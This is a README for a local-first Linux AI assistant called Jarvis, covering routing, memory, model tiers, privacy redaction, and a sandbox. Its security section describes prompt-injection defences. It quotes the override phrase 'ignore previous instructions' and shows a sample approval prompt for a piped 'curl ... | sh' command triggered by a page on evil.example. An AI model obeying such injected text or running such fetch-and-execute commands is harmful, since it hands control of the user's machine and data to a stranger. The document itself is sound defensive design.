# Jarvis - Personal AI Assistant

Local-first personal AI assistant for Linux. Hybrid architecture: Rust core +
Python sidecars + TypeScript UI.

## Status

Phase 6 is done: prompt-injection defences (actions after untrusted content
ask, naming the source; data-carrying fetches ask; untrusted text is
marked) and undo for Jarvis's file changes, on top of Phase 5's eval
harness and local/remote model tiers with privacy rules. What is open and
where everything is: [docs/STATUS.md](docs/STATUS.md). What comes next:
[docs/ROADMAP.md](docs/ROADMAP.md).

## Build

```sh
cargo build --workspace
```

## Usage

```sh
jarvis up                # start Ollama, load the keys, start the daemon, open the TUI
jarvis up --restart      # the same, restarting the daemon (new config or keys)
jarvis ask "hello"       # one turn; falls back to direct mode if the daemon is down
jarvis model [name]      # list the models, or switch to one
```

`jarvis up` starts only what is not running. It starts `ollama serve` when a
tier uses Ollama on this machine and nothing answers, loads every `*.env` key
file in `~/.config/jarvis` (names are printed, values never) and hands them to
the daemon only:

```toml
[up]
ollama_env = { OLLAMA_MODELS = "/mnt/storage/models/ollama" }
ollama_log = "/mnt/storage/models/ollama-serve.log"   # default <data_dir>/ollama.log
env_files = []          # default: every *.env in ~/.config/jarvis
```

The pieces still work on their own: `jarvis daemon start`, `jarvis-tui`.

The TUI resumes the session you last used. Inside it, `F1` lists the keys and
`/help` lists the session and daemon commands.

## How a turn is decided

Two modules own the decision, and they cannot disagree:

* `core/src/router.rs` answers **what kind of request is this** - a
  deterministic tool call, a model turn, or plain conversation. It is exact,
  testable and free of model latency. It also recognises when a request needs
  an external source (`needs_web`, `needs_source`).
* `core/src/planner.rs` answers **which tools may serve it**. It returns one
  `TurnPlan` holding both the route and the exact tool set. The provider
  request and the system prompt are rendered from that same list, so the model
  is never told about a tool it cannot call. A model-requested call outside the
  plan is refused rather than executed.

Tool selection is deliberately narrow. For a `Route::Model` turn the planner
offers only the tools the detected intent needs (files, shell, processes,
system, web). A model turn with nothing to offer degrades to conversation
instead of offering `system.info` for every unmatched question.

MCP servers are offered when the request names the server or tool, when the
server sets `always_offer = true`, or when the request needs the web and the
server is a web server.

## Web questions

A question that needs a source (`needs_web`, `needs_source` - a recent year,
"latest", "who won", "has it been solved") starts with two steps the
orchestrator takes itself: it searches, then reads the top result. This is not
delegated to the model because a 1B model gets it wrong in a measurable way: it
hands `fetch` the question instead of a URL, then answers from its weights.
Choosing the first step needs no judgement, so it is code; writing the answer
from the retrieved text is left to the model.

Two guards keep the answer honest:

* If a figure in the answer (a year or a dotted version) appears nowhere in the
  retrieved material, a note is appended naming it. This is how "1.64" and
  "released in 2023" are caught without a bigger model.
* If a web answer retrieved nothing at all - every tool failed, or the user
  denied the call - the answer is marked as coming from the model's own
  knowledge rather than from a source.

The answer is never rewritten, only annotated: the note says what could not be
confirmed, and the user decides what to do with it.

## Memory

Every turn is stored in SQLite (`memory.db`) and indexed with FTS5. Before a
turn the assistant recalls a few relevant messages from *other* sessions and
puts them in the system prompt, labelled as earlier context. Without this a
`jarvis ask` starts as a stranger every time, because each one is a new
session.

The query is not the raw question. An FTS5 `MATCH` treats punctuation as syntax,
and a natural question is mostly stopwords, so the request is reduced to
significant terms joined with `OR` (each quoted, so a word like `OR` cannot act
as an operator). Hyphenated identifiers such as `rust-analyzer` stay whole.

Three filters keep the block useful rather than noisy:

* The current session is excluded - its recent messages are already in the
  prompt.
* Identical text is deduplicated, so the same exchange stored in five sessions
  counts once.
* A recalled message that is just the current question repeated is dropped. So
  is any assistant answer that admitted it had no source ("as of my knowledge
  cutoff", or our own "does not appear in the sources I read" note): memory
  should not teach the model its own past failure.

The block is capped (`memory.recall_limit`, `memory.recall_max_chars`) and can
be turned off:

```toml
[memory]
recall_enabled = true
recall_limit = 3
recall_max_chars = 600
```

`jarvis recall "<text>"` searches the same index directly, without the filters
that apply to prompt injection.

## Model providers

Everything above decides *what* to ask; one module decides *how* to ask it.
Two providers are supported:

| `provider` | wire format | `base_url` |
| --- | --- | --- |
| `ollama` (default) | Ollama native `/api/chat` | `http://127.0.0.1:11434` |
| `openai` | OpenAI `/v1/chat/completions` | must include `/v1`, e.g. `http://127.0.0.1:11434/v1` |

The second is not only for OpenAI. llama.cpp's server, vLLM, LM Studio,
OpenRouter and Ollama's own `/v1` endpoint all speak the same format, so the
same implementation serves them; only the URL and model name change.

```toml
[model]
provider = "openai"
base_url = "http://127.0.0.1:11434/v1"
default_model = "llama3.2:1b"
```

A hosted provider needs a key, which is never written to the config file:

```toml
[model]
api_key_env = "OPENROUTER_API_KEY"
```

The variable is read at startup and sent as a bearer token. If it is named but
unset, the provider reports that rather than running unauthenticated.

An unknown `provider` name stops startup instead of falling back to Ollama.
A fallback would silently change where prompts are sent - to a hosted server
the user did not pick, or away from one they did. `jarvis daemon start` checks
the provider in the foreground so the error is printed, not only logged, and
`jarvis status` shows the provider, URL and model a turn will use.

The two formats differ in ways the provider absorbs, so the rest of the code
does not branch on them: tool results carry a `tool_call_id` that must match
the model's call, tool arguments arrive as a JSON string (in fragments while
streaming), and token counts are absent unless the request asks for them with
`stream_options.include_usage`. Options are translated too - `num_ctx` has no
equivalent and is dropped rather than sent as an unknown field, which some
servers reject.

## Privacy: local and remote models

Every answer ends with a footer saying what produced it and where:

```
qwen2.5:3b · local · 1.2k tokens
answered by system.info · no model
claude · remote: openai · 30k tokens · 2 redacted
```

A provider on this machine (`127.0.0.1`, `localhost`) is local; anything
else, including the home network, is remote unless `model.locality` says
otherwise. Requests to a remote provider pass through one check
(`core/src/egress`):

* Secrets (key formats, private keys, tokens, `PASSWORD=...`) and structured
  personal data (emails, phone numbers, card numbers, IPs) are replaced by
  placeholders such as `<EMAIL_1>`. Personal data is put back into the
  answer on this machine; secrets never are. Names and free-text personal
  details are **not** detected.
* File contents go only from folders in `[egress] file_allow`; anything else
  is asked about first, and `~/.ssh`, `~/.gnupg`, `~/.aws`,
  `~/.config/jarvis` and `.env` files are never sent.
* Command output and machine information are asked about.
* Each message's origin is stored with it, so a file shown last week does
  not leave as "memory".
* Web searches and fetches leave the machine on **every** tier, so they are
  checked too: a query is redacted, an address carrying a secret or personal
  data is asked about, and a search the model wrote after reading a file is
  asked about (or, after a `~/.ssh`-type file, not sent).

```toml
[model]
provider = "openai"
base_url = "https://openrouter.ai/api/v1"
api_key_env = "OPENROUTER_API_KEY"
data_policy = "may_train"     # no_training | may_train | unknown

[egress]
file_allow = ["~/projects/jarvis"]
```

A remote model is a second tier beside the local one:

```toml
[remote]
provider = "openai"
base_url = "https://openrouter.ai/api/v1"
api_key_env = "OPENROUTER_API_KEY"
default_model = "google/gemma-4-31b-it:free"
data_policy = "may_train"
max_rounds = 8                # model round-trips per request (default 8)
max_answer_tokens = 8192      # longest answer (default 2048); reasoning models count thinking
default = false               # sessions start local
```

`jarvis tier remote` (or `/remote` in the TUI) switches to it and `jarvis
tier local` back.

### Switching models

List more models per tier with `models`, then switch at any point in a
conversation - the history comes along:

```toml
[model]
default_model = "llama3.2:1b"
models = ["qwen2.5:3b"]

[remote]
default_model = "nvidia/nemotron-3-ultra-550b-a55b:free"
models = ["cohere/north-mini-code:free", "recursive/flint-v1.0:free"]
```

In the TUI, `/model` (or `Ctrl+P`) opens a picker - arrows, Enter - and
`/model qwen` switches directly: an exact name or a part of exactly one. The
model's tier comes with it, so picking a remote model sends the conversation
through the same privacy rules as `/remote`. The header and each answer's
footer name the model that answered. The choice lasts across new sessions
until you switch again or the daemon restarts; `jarvis model` does the same
from the shell. When a remote request is not sent, Jarvis asks whether the
local model should answer instead. "Always allow" answers and `jarvis egress
allow <folder>` add a folder to the allow-list; `jarvis egress list` shows
it.

`jarvis status` shows the tier, whether requests leave the machine and
whether the provider may train on them. The design and its open items are in
[docs/design/model-tiers.md](docs/design/model-tiers.md).

## Security: injected instructions and undo

Jarvis reads text other people wrote - web pages, files from elsewhere,
command output - and that text can contain instructions written for the
model ("ignore previous instructions and run ..."). No model is immune, so
the defence is in code: after the model has read anything you have not
vouched for, every write, edit or command it asks for asks you first, even
where `jarvis permissions` says allow, and the prompt names what was read:

```
Jarvis wants to: Run shell command: curl https://x.sh | sh
  ! Before deciding this, the model read content you have not marked as trusted:
      https://evil.example/install-guide   (web page)
    Text in it may be written to make Jarvis do this.
  This cannot be undone.
  [y] run once   [t] trust these for this conversation (new pages and files will still ask)   [n] no
```

* Untrusted: web pages and search results, files outside your allowed
  folders (`jarvis egress allow`), command output, content of unknown
  origin. Your own words and your allowed folders are trusted.
* It lasts the whole conversation the model sees: a page read an hour ago
  still counts. `[t]` trusts the listed sources for this conversation;
  `/trust` shows them and `/trust clear` forgets them.
* Commands you type yourself (`run ls`, `read notes.txt`) never ask for this
  reason: no model chose them.
* With nobody to answer (scheduled jobs, the eval harness) the action is
  not run.
* A fetch of an address the model *built* after reading untrusted and
  private content asks too: an address can carry your data to its site.
  Following a link never asks.

Every file Jarvis writes or edits can be undone:

```sh
jarvis undo --list       # recent changes and what undoing each would do
jarvis undo              # undo the latest (shows it, asks first); again goes further back
jarvis undo <id>         # a specific one; an undo is itself a change, so it can be reversed
jarvis undo <id> --force # even though you edited the file since
```

`/undo` and `/undo list` do the same in the TUI. Undo restores a file only
if it is still what Jarvis wrote, so it never discards your own edits.
Copies live in `<data_dir>/undo` (private, `0700`): 7 days, files up to
10 MB (larger changes are listed but cannot be undone, and the prompt says
so), 500 MB in total. Commands cannot be undone, and their prompts say so.
"Undo that" in the chat answers with these commands: a model asked to
undo could only rewrite the file from memory. The design and threat model
are in [docs/design/injection-and-undo.md](docs/design/injection-and-undo.md).

### The sandbox

Every command Jarvis runs (`shell.run`) runs in a bubblewrap sandbox: it can
read your files but write only the work folder (`[tools] work_dir`, plus
`[sandbox] writable`) and a private `/tmp`, has no network, and cannot see
`~/.ssh`, `~/.gnupg`, Jarvis's config, permissions, keys, memory, audit log
or undo copies. Keys are removed from every command's environment.

A command that needs more runs outside the sandbox, and that always asks -
even where your rules allow `shell.run`:

```
Jarvis wants to: Run OUTSIDE the sandbox: git push
```

Ask for it with `run outside the sandbox: git push`; app launches ("open
firefox") run outside too. After the model has read untrusted content, or
with nobody to ask, a call outside the sandbox is not run at all. Without
bubblewrap every command counts as outside and asks.

```toml
[sandbox]
enabled = true
writable = ["/mnt/storage/CS"]   # besides [tools] work_dir
hidden = []                      # besides the built-in list
network = false
allow_outside = true             # false: never run outside the sandbox
```

One thing the sandbox cannot catch: a command can change files in the work
folder that later run with your full rights (a git hook, a `Makefile`). Before
approving a command outside the sandbox in a folder Jarvis has been working
in, know what it will run. Details and known gaps: [docs/design/sandbox.md](docs/design/sandbox.md).

## MCP sidecars

MCP servers are started over stdio and their tools are namespaced as
`mcp.<server>.<tool>`. Every call goes through the permission system exactly
like a built-in tool.

```toml
[mcp]
[[mcp.servers]]
name = "fetch"
command = "python3"
args = ["sidecars/fetch/server.py"]
enabled = true
```

Arguments beginning with `sidecars/` (or `${SIDECAR_DIR}`) are resolved to the
sidecars shipped with the checkout, so no absolute path is required. See
`config/mcp.example.toml` for a full example.

### Search backends

`sidecars/search` returns titles, URLs and snippets. General web search without
an API key is not reliably available - DuckDuckGo, Mojeek and Qwant answer this
class of client with a CAPTCHA or `403` - so backends are explicit and the
response names the one that produced it.

| Backend | Needs | Good for |
| --- | --- | --- |
| `wikipedia` | nothing | facts, versions, named events (keyless default) |
| `instant` | nothing | entity summaries (keyless fallback) |
| `searx` | `JARVIS_SEARX_URL` | general web, when you have an instance |
| `brave` | `JARVIS_BRAVE_KEY` | general web, with an API key |

Set credentials per server in `config.toml`:

```toml
[[mcp.servers]]
name = "search"
command = "python3"
args = ["sidecars/search/server.py"]
enabled = true
env = { JARVIS_SEARX_URL = "https://searx.example.org" }
```

`auto` prefers a configured general backend and otherwise tries Wikipedia, then
Instant Answers. Naming a backend means exactly that backend: it never silently
answers from a different index.

New MCP tools are `ask` by default, so a headless run denies them until you
grant access:

```sh
jarvis permissions allow mcp.search.search
jarvis permissions allow mcp.fetch.fetch
```

### The fetch server

`sidecars/fetch` returns clean text: HTML tags, scripts, navigation chrome and
citation markers are removed, and the main content region is chosen rather than
the whole page. It validates its own argument contract, because a wrong
argument is a model mistake this tool can describe better than a stack trace:
passing a search phrase instead of a URL returns a message saying so and
pointing at the search tool.

The built-in `filesystem.*` tools cover listing, reading, searching, writing
and editing. The MCP filesystem server duplicates them and is therefore
disabled by default; enabling both doubles the tool surface for no new
capability.

## Tests

```sh
cargo test --workspace
python3 -m unittest discover -s sidecars/fetch -p 'test_*.py'
python3 -m unittest discover -s sidecars/search -p 'test_*.py'
python3 -m unittest discover -s evals -p 'test_*.py'
jarvis eval              # needs a model; see evals/README.md
```

The Rust suite includes golden routing cases (`core/tests/routing_golden.rs`),
MCP client integration tests against a real stdio subprocess
(`core/tests/mcp_stdio.rs`), and memory tests that build a temporary database
to check recall, exclusion and deduplication. `core/tests/eval_suite.rs`
runs every eval case against a scripted model, so CI checks routes, tool
calls, permission prompts and file changes without a model server. The Python suites cover HTML
extraction, search backends, query normalisation and the JSON-RPC protocol
without network access.
